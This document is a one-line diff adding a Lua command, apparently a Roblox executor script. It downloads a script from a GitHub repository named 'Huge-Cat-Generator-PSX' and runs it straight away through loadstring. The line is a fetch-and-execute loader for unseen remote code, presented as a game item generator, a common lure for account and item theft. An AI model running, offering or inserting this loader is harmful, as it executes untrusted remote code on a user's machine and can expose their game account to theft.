@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AntoniTGS/Huge-Cat-Generator-PSX/main/Script.lua"))()
